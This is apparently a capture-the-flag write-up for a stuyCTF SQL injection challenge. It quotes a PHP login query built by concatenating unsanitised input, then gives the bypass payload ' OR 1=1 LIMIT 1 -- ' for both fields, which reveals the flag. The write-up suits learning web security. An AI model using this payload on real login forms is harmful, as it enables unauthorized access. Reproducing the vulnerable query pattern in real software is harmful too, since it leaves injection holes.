Looking at the php file provided to us, the only important line for our matters is:
**$query = "SELECT * FROM users where username='$username' AND password='$password'";**

if the  variables username and password evaluate to true, then the flag is presented to us.
SQL injection focuses on submitting condition that evaluates to true, and thus get the information
without the correct credentials.
Therefore, when prompted for the username and password on: http://stuyctf.me/php/SIMPLE-SQL-INJECTION/index.php
I entered:

Username: ' OR 1=1 LIMIT 1 -- '
Password: ' OR 1=1 LIMIT 1 -- '

Basically if they enter the correct username and password OR 1 equals 1 which is always true, then return true.

We then get redirected to a page which reads:

**stuyCTF Login Status:**

**Logged in!**

**Your flag is stuyctf{sql_injections_are_fun_but_also_the_biggest_web_problem}**

Flag: stuyctf{sql_injections_are_fun_but_also_the_biggest_web_problem}
